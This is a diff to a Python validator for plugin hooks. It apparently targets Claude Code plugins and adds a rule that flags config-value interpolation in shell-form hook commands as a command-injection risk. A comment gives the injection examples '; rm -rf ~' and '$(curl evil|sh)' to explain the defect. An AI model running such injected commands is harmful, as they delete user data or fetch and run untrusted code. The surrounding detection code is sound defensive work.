@@ -195,6 +195,32 @@ def user_config_shell_finding(surface: str, tokens: list[str], where: str) -> st
         f"would otherwise execute as code. Fix: {USER_CONFIG_REMEDIATION[surface]}."
     )
 
+
+def hook_is_exec_form(hook: object) -> bool:
+    """True iff ``hook`` is an EXEC-FORM command hook (the v2.1.139 ``args`` argv).
+
+    THIS PREDICATE IS THE WHOLE CC-v2.1.207 RULE. Exec form spawns ``command``
+    directly with ``args`` as the argv vector — no shell ever parses the tokens,
+    so a ``${user_config.*}`` value cannot escape its argument slot and become
+    code. Shell form hands ONE string to a shell, where it can. Hence: flag the
+    token in shell form, NEVER in exec form (exec form is the fix the changelog
+    prescribes — flagging it would flag the remedy).
+
+    FAIL-SAFE by construction: only a well-formed, NON-EMPTY list of ``args``
+    counts as exec form. A missing / non-list / empty ``args`` is NOT exec form,
+    so the shell-injection rule still applies to it. That is the conservative
+    direction for a security rule — a malformed ``args`` is separately reported
+    as a shape error, and we must never let a malformed one buy an exemption.
+
+    ``hook`` is typed ``object`` for the same reason as
+    ``find_user_config_interpolations``: callers feed it values parsed from an
+    untrusted plugin's JSON, which may be any type at all.
+    """
+    if not isinstance(hook, dict):
+        return False
+    args = hook.get("args")
+    return isinstance(args, list) and bool(args)
+
 # NOTE: COMMAND_ONLY_EVENTS (tier 2 — no prompt/agent) and COMMAND_STRICT_EVENTS
 # (tier 3 — command/mcp_tool only) are imported at the top of this module from
 # cpv_validation_common, the single source of truth for the per-event hook-type
@@ -2546,6 +2572,33 @@ def validate_command_hook(
         assert args_val is not None  # has_args is True
         command = " ".join(args_val)
         report.passed(f"Args (exec form, args-only, {len(args_val)} token(s)): {command[:60]}...")
+
+    # -------------------------------------------------------------------------
+    # CC v2.1.207 — ${user_config.*} in a SHELL-FORM hook command is REJECTED.
+    # -------------------------------------------------------------------------
+    # WHY (full rationale at USER_CONFIG_INTERP_RE, top of this module): a
+    # shell-form command is ONE string handed to a shell, so a config value
+    # carrying `; rm -rf ~` or `$(curl evil|sh)` escapes its argument slot and
+    # EXECUTES. Claude Code now refuses to run such a hook, so it is BROKEN at
+    # runtime as well as unsafe — CRITICAL, not a warning.
+    #
+    # `hook_is_exec_form` is the discriminator and it is the entire rule: in
+    # exec form the SAME token sits in the `args` argv vector, no shell parses
+    # it, and that is precisely the fix the changelog prescribes. Never flag it.
+    # `$CLAUDE_PLUGIN_OPTION_<KEY>` is an env read (the other prescribed fix),
+    # not an interpolation — it cannot match the token grammar, so it likewise
+    # never fires here. Do not "simplify" this into a plain token search.
+    #
+    # NOTE it does not `return False`: this is a content defect, not a shape
+    # error, so the remaining portability/script checks still have work to do.
+    if has_command and not hook_is_exec_form(hook):
+        shell_form_tokens = find_user_config_interpolations(hook["command"])
+        if shell_form_tokens:
+            report.critical(
+                user_config_shell_finding(
+                    "hook", shell_form_tokens, f"{event_name} command hook"
+                )
+            )
 
     # Check for hardcoded absolute paths — plugins must use env vars for portability
     cmd_first_token = command.strip().split()[0] if command.strip() else ""
